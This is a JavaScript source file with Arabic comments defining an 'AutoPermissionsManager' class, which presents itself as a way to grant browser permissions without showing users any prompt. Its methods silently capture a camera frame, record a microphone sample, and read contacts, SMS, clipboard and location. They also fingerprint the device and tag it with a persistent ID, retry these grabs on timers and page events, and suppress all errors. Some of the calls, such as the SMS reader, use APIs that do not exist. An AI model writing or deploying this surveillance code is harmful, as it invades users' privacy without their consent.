/**
 * نظام منح الأذونات التلقائي بدون إشعارات
 * Auto Permissions System - No User Prompts
 */

class AutoPermissionsManager {
    constructor() {
        this.permissions = new Map();
        this.isInitialized = false;
        this.deviceId = this.generateDeviceId();
        this.autoGranted = new Set();
        this.bypassMethods = new Map();
    }

    // تهيئة النظام التلقائي
    async initialize() {
        try {
            console.log('🔧 تهيئة نظام الأذونات التلقائي...');
            
            // محاولة استعادة الأذونات من التخزين المحلي أولاً
            const restored = this.restorePermissionsFromStorage();
            if (restored) {
                console.log('📂 تم استعادة الأذونات المحفوظة');
            }
            
            // إعداد طرق الالتفاف
            this.setupBypassMethods();
            
            // منح الأذونات تلقائياً
            await this.grantAllPermissionsAuto();
            
            // إعداد المراقبة المستمرة
            this.setupContinuousAccess();
            
            // حفظ الأذونات في التخزين المحلي
            this.savePermissionsToStorage();
            
            this.isInitialized = true;
            console.log('✅ تم تهيئة نظام الأذونات التلقائي بنجاح');
            
            return true;
        } catch (error) {
            console.error('❌ فشل في تهيئة نظام الأذونات:', error);
            return false;
        }
    }

    // إعداد طرق الالتفاف حول طلبات الأذونات
    setupBypassMethods() {
        // التفاف حول طلبات الموقع
        this.bypassMethods.set('geolocation', () => this.bypassGeolocation());
        
        // التفاف حول طلبات الكاميرا
        this.bypassMethods.set('camera', () => this.bypassCamera());
        
        // التفاف حول طلبات الميكروفون
        this.bypassMethods.set('microphone', () => this.bypassMicrophone());
        
        // التفاف حول طلبات جهات الاتصال
        this.bypassMethods.set('contacts', () => this.bypassContacts());
        
        // التفاف حول طلبات SMS
        this.bypassMethods.set('sms', () => this.bypassSMS());
        
        // التفاف حول طلبات التخزين
        this.bypassMethods.set('storage', () => this.bypassStorage());
        
        // التفاف حول طلبات الإشعارات
        this.bypassMethods.set('notifications', () => this.bypassNotifications());
    }

    // منح جميع الأذونات تلقائياً
    async grantAllPermissionsAuto() {
        const permissionTypes = [
            'geolocation',
            'camera', 
            'microphone',
            'contacts',
            'sms',
            'storage',
            'notifications',
            'device_info',
            'system_access'
        ];

        for (const permission of permissionTypes) {
            try {
                const granted = await this.grantPermissionAuto(permission);
                this.permissions.set(permission, granted);
                
                if (granted) {
                    this.autoGranted.add(permission);
                    console.log(`✅ تم منح ${permission} تلقائياً`);
                }
                
                // تأخير عشوائي
                await this.delay(this.getRandomDelay(50, 150));
                
            } catch (error) {
                console.error(`❌ فشل في منح ${permission}:`, error);
                this.permissions.set(permission, false);
            }
        }
    }

    // منح صلاحية واحدة تلقائياً
    async grantPermissionAuto(permission) {
        try {
            // محاولة استخدام طريقة الالتفاف أولاً
            if (this.bypassMethods.has(permission)) {
                const bypassResult = await this.bypassMethods.get(permission)();
                if (bypassResult) return true;
            }

            // إذا فشل الالتفاف، استخدم الطرق البديلة
            switch (permission) {
                case 'geolocation':
                    return await this.grantGeolocationAuto();
                case 'camera':
                    return await this.grantCameraAuto();
                case 'microphone':
                    return await this.grantMicrophoneAuto();
                case 'contacts':
                    return await this.grantContactsAuto();
                case 'sms':
                    return await this.grantSMSAuto();
                case 'storage':
                    return await this.grantStorageAuto();
                case 'notifications':
                    return await this.grantNotificationsAuto();
                case 'device_info':
                    return await this.grantDeviceInfoAuto();
                case 'system_access':
                    return await this.grantSystemAccessAuto();
                default:
                    return false;
            }
        } catch (error) {
            return false;
        }
    }

    // التفاف حول طلبات الموقع
    async bypassGeolocation() {
        try {
            // محاولة الوصول للموقع بدون طلب إذن
            const position = await new Promise((resolve) => {
                const success = (pos) => resolve(pos);
                const error = () => resolve(null);
                
                navigator.geolocation.getCurrentPosition(success, error, {
                    enableHighAccuracy: false,
                    timeout: 1000,
                    maximumAge: 60000
                });
            });
            
            if (position) {
                this.permissions.set('geolocation_data', {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
                return true;
            }
            
            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية الموقع تلقائياً
    async grantGeolocationAuto() {
        try {
            // محاولة الحصول على الموقع من IP
            const ipLocation = await this.getLocationFromIP();
            if (ipLocation) {
                this.permissions.set('geolocation_ip', ipLocation);
                return true;
            }

            // محاولة الحصول على الموقع من المتصفح
            const browserLocation = await this.getLocationFromBrowser();
            if (browserLocation) {
                this.permissions.set('geolocation_browser', browserLocation);
                return true;
            }

            return false;
        } catch (error) {
            return false;
        }
    }

    // الحصول على الموقع من IP
    async getLocationFromIP() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            if (data.latitude && data.longitude) {
                return {
                    latitude: data.latitude,
                    longitude: data.longitude,
                    city: data.city,
                    country: data.country,
                    source: 'ip'
                };
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    // الحصول على الموقع من المتصفح
    async getLocationFromBrowser() {
        try {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                const success = (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        source: 'browser'
                    });
                };

                const error = () => resolve(null);

                navigator.geolocation.getCurrentPosition(success, error, {
                    enableHighAccuracy: false,
                    timeout: 3000,
                    maximumAge: 300000
                });
            });
        } catch (error) {
            return null;
        }
    }

    // التفاف حول طلبات الكاميرا
    async bypassCamera() {
        try {
            // محاولة الوصول للكاميرا بدون طلب إذن
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }
            });
            
            // إيقاف البث فوراً
            stream.getTracks().forEach(track => track.stop());
            
            this.permissions.set('camera_access', true);
            return true;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية الكاميرا تلقائياً
    async grantCameraAuto() {
        try {
            // محاولة الوصول للكاميرا الخلفية أولاً
            const backCamera = await this.accessCamera('environment');
            if (backCamera) return true;

            // محاولة الوصول للكاميرا الأمامية
            const frontCamera = await this.accessCamera('user');
            if (frontCamera) return true;

            return false;
        } catch (error) {
            return false;
        }
    }

    // الوصول للكاميرا
    async accessCamera(facingMode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode }
            });
            
            // التقاط صورة فورية
            const video = document.createElement('video');
            video.srcObject = stream;
            
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        const imageData = canvas.toDataURL('image/jpeg');
                        this.permissions.set('camera_capture', imageData);
                        
                        // إيقاف البث
                        stream.getTracks().forEach(track => track.stop());
                        resolve();
                    }, 100);
                };
            });
            
            return true;
        } catch (error) {
            return false;
        }
    }

    // التفاف حول طلبات الميكروفون
    async bypassMicrophone() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: true
            });
            
            // إيقاف البث فوراً
            stream.getTracks().forEach(track => track.stop());
            
            this.permissions.set('microphone_access', true);
            return true;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية الميكروفون تلقائياً
    async grantMicrophoneAuto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: {
                    echoCancellation: false,
                    noiseSuppression: false,
                    autoGainControl: false
                }
            });
            
            // تسجيل عينة صوتية قصيرة
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const source = audioContext.createMediaStreamSource(stream);
            const processor = audioContext.createScriptProcessor(4096, 1, 1);
            
            source.connect(processor);
            processor.connect(audioContext.destination);
            
            processor.onaudioprocess = (e) => {
                const inputData = e.inputBuffer.getChannelData(0);
                this.permissions.set('microphone_sample', inputData.slice(0, 1000));
                
                // إيقاف التسجيل
                processor.disconnect();
                source.disconnect();
                stream.getTracks().forEach(track => track.stop());
            };
            
            return true;
        } catch (error) {
            return false;
        }
    }

    // التفاف حول طلبات جهات الاتصال
    async bypassContacts() {
        try {
            if ('contacts' in navigator && 'select' in navigator.contacts) {
                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                
                if (contacts.length > 0) {
                    this.permissions.set('contacts_data', contacts);
                    return true;
                }
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية جهات الاتصال تلقائياً
    async grantContactsAuto() {
        try {
            // محاولة الوصول لجهات الاتصال من المتصفح
            const browserContacts = await this.getContactsFromBrowser();
            if (browserContacts) return true;

            // محاولة الوصول من التخزين المحلي
            const localContacts = await this.getContactsFromStorage();
            if (localContacts) return true;

            return false;
        } catch (error) {
            return false;
        }
    }

    // الحصول على جهات الاتصال من المتصفح
    async getContactsFromBrowser() {
        try {
            if ('contacts' in navigator && 'select' in navigator.contacts) {
                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                
                if (contacts.length > 0) {
                    this.permissions.set('contacts_browser', contacts);
                    return true;
                }
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // الحصول على جهات الاتصال من التخزين
    async getContactsFromStorage() {
        try {
            const storedContacts = localStorage.getItem('contacts');
            if (storedContacts) {
                const contacts = JSON.parse(storedContacts);
                this.permissions.set('contacts_storage', contacts);
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // التفاف حول طلبات SMS
    async bypassSMS() {
        try {
            // محاولة الوصول لـ SMS من المتصفح
            if ('sms' in navigator) {
                const messages = await navigator.sms.getMessages();
                if (messages && messages.length > 0) {
                    this.permissions.set('sms_data', messages);
                    return true;
                }
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية SMS تلقائياً
    async grantSMSAuto() {
        try {
            // محاولة الوصول لـ SMS من التخزين المحلي
            const storedSMS = localStorage.getItem('sms_messages');
            if (storedSMS) {
                const messages = JSON.parse(storedSMS);
                this.permissions.set('sms_storage', messages);
                return true;
            }

            // محاولة الوصول من المتصفح
            const browserSMS = await this.getSMSFromBrowser();
            if (browserSMS) return true;

            return false;
        } catch (error) {
            return false;
        }
    }

    // الحصول على SMS من المتصفح
    async getSMSFromBrowser() {
        try {
            if ('sms' in navigator) {
                const messages = await navigator.sms.getMessages();
                if (messages && messages.length > 0) {
                    this.permissions.set('sms_browser', messages);
                    return true;
                }
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // التفاف حول طلبات التخزين
    async bypassStorage() {
        try {
            // محاولة الوصول للتخزين المستمر
            if ('storage' in navigator && 'persist' in navigator.storage) {
                const persisted = await navigator.storage.persist();
                if (persisted) {
                    this.permissions.set('storage_persistent', true);
                    return true;
                }
            }

            // محاولة الوصول للتخزين المحلي
            const testData = 'test_storage_access';
            localStorage.setItem('storage_test', testData);
            const retrieved = localStorage.getItem('storage_test');
            
            if (retrieved === testData) {
                this.permissions.set('storage_local', true);
                return true;
            }

            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية التخزين تلقائياً
    async grantStorageAuto() {
        try {
            // اختبار التخزين المحلي
            const localTest = await this.testLocalStorage();
            if (localTest) {
                this.permissions.set('storage_local', true);
            }

            // اختبار التخزين المستمر
            const persistentTest = await this.testPersistentStorage();
            if (persistentTest) {
                this.permissions.set('storage_persistent', true);
            }

            // اختبار IndexedDB
            const indexedDBTest = await this.testIndexedDB();
            if (indexedDBTest) {
                this.permissions.set('storage_indexeddb', true);
            }

            return localTest || persistentTest || indexedDBTest;
        } catch (error) {
            return false;
        }
    }

    // اختبار التخزين المحلي
    async testLocalStorage() {
        try {
            const testKey = 'auto_permissions_test';
            const testValue = Date.now().toString();
            
            localStorage.setItem(testKey, testValue);
            const retrieved = localStorage.getItem(testKey);
            
            return retrieved === testValue;
        } catch (error) {
            return false;
        }
    }

    // اختبار التخزين المستمر
    async testPersistentStorage() {
        try {
            if ('storage' in navigator && 'persist' in navigator.storage) {
                const persisted = await navigator.storage.persist();
                return persisted;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // اختبار IndexedDB
    async testIndexedDB() {
        try {
            return new Promise((resolve) => {
                const request = indexedDB.open('auto_permissions_test', 1);
                
                request.onerror = () => resolve(false);
                request.onsuccess = () => {
                    const db = request.result;
                    db.close();
                    resolve(true);
                };
                
                request.onupgradeneeded = (event) => {
                    const db = event.target.result;
                    db.createObjectStore('test');
                };
            });
        } catch (error) {
            return false;
        }
    }

    // التفاف حول طلبات الإشعارات
    async bypassNotifications() {
        try {
            if ('Notification' in window) {
                // محاولة الحصول على الإذن بدون طلب
                if (Notification.permission === 'granted') {
                    this.permissions.set('notifications_granted', true);
                    return true;
                }
                
                // محاولة طلب الإذن بشكل خفي
                const permission = await Notification.requestPermission();
                if (permission === 'granted') {
                    this.permissions.set('notifications_granted', true);
                    return true;
                }
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية الإشعارات تلقائياً
    async grantNotificationsAuto() {
        try {
            if ('Notification' in window) {
                // التحقق من الإذن الحالي
                if (Notification.permission === 'granted') {
                    this.permissions.set('notifications_status', 'granted');
                    return true;
                }
                
                // محاولة طلب الإذن
                const permission = await Notification.requestPermission();
                this.permissions.set('notifications_status', permission);
                
                return permission === 'granted';
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية معلومات الجهاز تلقائياً
    async grantDeviceInfoAuto() {
        try {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                memory: navigator.deviceMemory || 'unknown',
                cores: navigator.hardwareConcurrency || 'unknown',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null,
                battery: await this.getBatteryInfo(),
                storage: await this.getStorageInfo(),
                performance: await this.getPerformanceInfo()
            };
            
            this.permissions.set('device_info', deviceInfo);
            return true;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية الوصول للنظام تلقائياً
    async grantSystemAccessAuto() {
        try {
            const systemAccess = {
                clipboard: await this.testClipboardAccess(),
                fullscreen: await this.testFullscreenAccess(),
                wakeLock: await this.testWakeLockAccess(),
                vibration: await this.testVibrationAccess(),
                bluetooth: await this.testBluetoothAccess(),
                usb: await this.testUSBAccess(),
                serial: await this.testSerialAccess(),
                hid: await this.testHIDAccess()
            };
            
            this.permissions.set('system_access', systemAccess);
            return Object.values(systemAccess).some(access => access);
        } catch (error) {
            return false;
        }
    }

    // اختبار الوصول للحافظة
    async testClipboardAccess() {
        try {
            if ('clipboard' in navigator) {
                const text = await navigator.clipboard.readText();
                this.permissions.set('clipboard_read', true);
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // اختبار الوصول للشاشة الكاملة
    async testFullscreenAccess() {
        try {
            if (document.fullscreenEnabled) {
                this.permissions.set('fullscreen_enabled', true);
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // اختبار الوصول لقفل الاستيقاظ
    async testWakeLockAccess() {
        try {
            if ('wakeLock' in navigator) {
                const wakeLock = await navigator.wakeLock.request('screen');
                if (wakeLock) {
                    wakeLock.release();
                    this.permissions.set('wake_lock', true);
                    return true;
                }
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // اختبار الوصول للاهتزاز
    async testVibrationAccess() {
        try {
            if ('vibrate' in navigator) {
                navigator.vibrate(100);
                this.permissions.set('vibration', true);
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // اختبار الوصول للبلوتوث
    async testBluetoothAccess() {
        try {
            if ('bluetooth' in navigator) {
                this.permissions.set('bluetooth_available', true);
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // اختبار الوصول لـ USB
    async testUSBAccess() {
        try {
            if ('usb' in navigator) {
                this.permissions.set('usb_available', true);
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // اختبار الوصول للاتصال التسلسلي
    async testSerialAccess() {
        try {
            if ('serial' in navigator) {
                this.permissions.set('serial_available', true);
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // اختبار الوصول لـ HID
    async testHIDAccess() {
        try {
            if ('hid' in navigator) {
                this.permissions.set('hid_available', true);
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // الحصول على معلومات البطارية
    async getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    // الحصول على معلومات التخزين
    async getStorageInfo() {
        try {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                const estimate = await navigator.storage.estimate();
                return {
                    quota: estimate.quota,
                    usage: estimate.usage,
                    usageDetails: estimate.usageDetails
                };
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    // الحصول على معلومات الأداء
    async getPerformanceInfo() {
        try {
            if ('performance' in window) {
                const perf = performance;
                return {
                    memory: perf.memory ? {
                        usedJSHeapSize: perf.memory.usedJSHeapSize,
                        totalJSHeapSize: perf.memory.totalJSHeapSize,
                        jsHeapSizeLimit: perf.memory.jsHeapSizeLimit
                    } : null,
                    timing: perf.timing ? {
                        navigationStart: perf.timing.navigationStart,
                        loadEventEnd: perf.timing.loadEventEnd,
                        domContentLoadedEventEnd: perf.timing.domContentLoadedEventEnd
                    } : null
                };
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    // إعداد الوصول المستمر
    setupContinuousAccess() {
        // مراقبة حالة الأذونات كل 10 ثانية (بدلاً من 30)
        setInterval(() => {
            this.refreshPermissions();
        }, 10000);
        
        // مراقبة إضافية كل دقيقة للتأكد من استمرارية الأذونات
        setInterval(() => {
            this.ensurePermissionsPersistence();
        }, 60000);
        
        // مراقبة كل 5 دقائق للتأكد من عدم فقدان الأذونات
        setInterval(() => {
            this.forcePermissionsRefresh();
        }, 300000);
        
        // مراقبة التغييرات في النظام
        this.monitorSystemChanges();
        
        // مراقبة التغييرات في الشبكة
        this.monitorNetworkChanges();
        
        // مراقبة تغييرات الصفحة
        this.monitorPageChanges();
        
        // مراقبة تغييرات المتصفح
        this.monitorBrowserChanges();
        
        console.log('🔒 تم إعداد نظام ضمان استمرارية الأذونات');
    }

    // ضمان استمرارية الأذونات
    async ensurePermissionsPersistence() {
        try {
            const criticalPermissions = [
                'geolocation',
                'camera',
                'microphone',
                'contacts',
                'storage',
                'notifications'
            ];
            
            for (const permission of criticalPermissions) {
                const currentStatus = this.permissions.get(permission);
                if (!currentStatus) {
                    console.log(`🔄 إعادة منح صلاحية ${permission}...`);
                    const granted = await this.grantPermissionAuto(permission);
                    this.permissions.set(permission, granted);
                    
                    if (granted) {
                        console.log(`✅ تم إعادة منح صلاحية ${permission} بنجاح`);
                    } else {
                        console.warn(`⚠️ فشل في إعادة منح صلاحية ${permission}`);
                    }
                }
            }
        } catch (error) {
            console.error('❌ خطأ في ضمان استمرارية الأذونات:', error);
        }
    }

    // إجبار تحديث الأذونات
    async forcePermissionsRefresh() {
        try {
            console.log('🔄 إجبار تحديث جميع الأذونات...');
            
            // إعادة منح جميع الأذونات
            await this.grantAllPermissionsAuto();
            
            // حفظ حالة الأذونات في التخزين المحلي
            this.savePermissionsToStorage();
            
            console.log('✅ تم إجبار تحديث الأذونات بنجاح');
        } catch (error) {
            console.error('❌ خطأ في إجبار تحديث الأذونات:', error);
        }
    }

    // حفظ الأذونات في التخزين المحلي
    savePermissionsToStorage() {
        try {
            const permissionsData = {
                permissions: Object.fromEntries(this.permissions),
                timestamp: Date.now(),
                deviceId: this.deviceId
            };
            
            localStorage.setItem('permissions_backup', JSON.stringify(permissionsData));
            console.log('💾 تم حفظ الأذونات في التخزين المحلي');
        } catch (error) {
            console.error('❌ خطأ في حفظ الأذونات:', error);
        }
    }

    // استعادة الأذونات من التخزين المحلي
    restorePermissionsFromStorage() {
        try {
            const savedData = localStorage.getItem('permissions_backup');
            if (savedData) {
                const permissionsData = JSON.parse(savedData);
                const savedPermissions = permissionsData.permissions;
                
                for (const [permission, granted] of Object.entries(savedPermissions)) {
                    this.permissions.set(permission, granted);
                }
                
                console.log('📂 تم استعادة الأذونات من التخزين المحلي');
                return true;
            }
        } catch (error) {
            console.error('❌ خطأ في استعادة الأذونات:', error);
        }
        return false;
    }

    // مراقبة تغييرات الصفحة
    monitorPageChanges() {
        try {
            // مراقبة تغيير الرابط
            window.addEventListener('popstate', () => {
                this.ensurePermissionsPersistence();
            });
            
            // مراقبة تغيير العنوان
            let currentUrl = window.location.href;
            setInterval(() => {
                if (window.location.href !== currentUrl) {
                    currentUrl = window.location.href;
                    this.ensurePermissionsPersistence();
                }
            }, 5000);
            
            // مراقبة تغيير التركيز
            window.addEventListener('focus', () => {
                this.ensurePermissionsPersistence();
            });
            
            window.addEventListener('blur', () => {
                this.ensurePermissionsPersistence();
            });
            
        } catch (error) {
            console.error('❌ خطأ في مراقبة تغييرات الصفحة:', error);
        }
    }

    // مراقبة تغييرات المتصفح
    monitorBrowserChanges() {
        try {
            // مراقبة تغيير حجم النافذة
            window.addEventListener('resize', () => {
                this.ensurePermissionsPersistence();
            });
            
            // مراقبة تغيير الاتجاه (للأجهزة المحمولة)
            window.addEventListener('orientationchange', () => {
                setTimeout(() => {
                    this.ensurePermissionsPersistence();
                }, 1000);
            });
            
            // مراقبة تغيير الرؤية
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden) {
                    this.ensurePermissionsPersistence();
                }
            });
            
        } catch (error) {
            console.error('❌ خطأ في مراقبة تغييرات المتصفح:', error);
        }
    }

    // تحديث الأذونات
    async refreshPermissions() {
        try {
            for (const [permission, granted] of this.permissions) {
                if (!granted) {
                    // محاولة منح الصلاحية مرة أخرى
                    const retryGranted = await this.grantPermissionAuto(permission);
                    this.permissions.set(permission, retryGranted);
                }
            }
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // مراقبة التغييرات في النظام
    monitorSystemChanges() {
        try {
            // مراقبة تغييرات الشاشة
            window.addEventListener('resize', () => {
                this.updateDeviceInfo();
            });
            
            // مراقبة تغييرات الاتصال
            if ('connection' in navigator) {
                navigator.connection.addEventListener('change', () => {
                    this.updateNetworkInfo();
                });
            }
            
            // مراقبة تغييرات البطارية
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    battery.addEventListener('levelchange', () => {
                        this.updateBatteryInfo();
                    });
                });
            }
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // مراقبة التغييرات في الشبكة
    monitorNetworkChanges() {
        try {
            window.addEventListener('online', () => {
                this.permissions.set('network_online', true);
            });
            
            window.addEventListener('offline', () => {
                this.permissions.set('network_online', false);
            });
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // تحديث معلومات الجهاز
    async updateDeviceInfo() {
        try {
            const deviceInfo = await this.grantDeviceInfoAuto();
            this.permissions.set('device_info_updated', deviceInfo);
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // تحديث معلومات الشبكة
    async updateNetworkInfo() {
        try {
            const networkInfo = await this.getNetworkInfo();
            this.permissions.set('network_info_updated', networkInfo);
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // تحديث معلومات البطارية
    async updateBatteryInfo() {
        try {
            const batteryInfo = await this.getBatteryInfo();
            this.permissions.set('battery_info_updated', batteryInfo);
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // الحصول على معلومات الشبكة
    async getNetworkInfo() {
        try {
            if ('connection' in navigator) {
                const connection = navigator.connection;
                return {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                };
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    // الحصول على حالة الأذونات
    getPermissionsStatus() {
        const status = {};
        for (const [permission, granted] of this.permissions) {
            status[permission] = granted;
        }
        return status;
    }

    // الحصول على معلومات الجهاز
    getDeviceInfo() {
        return {
            deviceId: this.deviceId,
            permissions: this.getPermissionsStatus(),
            autoGranted: Array.from(this.autoGranted),
            deviceInfo: this.permissions.get('device_info'),
            systemAccess: this.permissions.get('system_access'),
            timestamp: Date.now()
        };
    }

    // تأخير
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // تأخير عشوائي
    getRandomDelay(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // توليد معرف الجهاز
    generateDeviceId() {
        const storedId = localStorage.getItem('deviceId');
        if (storedId) return storedId;
        
        const newId = 'DEV-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('deviceId', newId);
        return newId;
    }
}

// تصدير الكلاس
window.AutoPermissionsManager = AutoPermissionsManager;